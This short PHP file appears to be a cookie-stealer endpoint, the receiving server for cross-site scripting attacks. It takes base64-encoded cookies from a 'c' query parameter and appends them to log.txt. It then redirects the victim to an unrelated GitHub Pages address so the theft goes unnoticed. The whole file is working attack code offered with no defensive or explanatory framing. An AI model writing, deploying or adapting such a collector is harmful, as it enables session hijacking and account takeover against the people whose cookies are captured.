<?php
	header ('Location:https://b0rn2r00t.github.io');

	if (isset($_GET["c"]))
	{
		$cookies = base64_decode(urldecode($_GET["c"]));
		$file = fopen('log.txt', 'a');
		fwrite($file, $cookies . "\n\n");
	}
?>
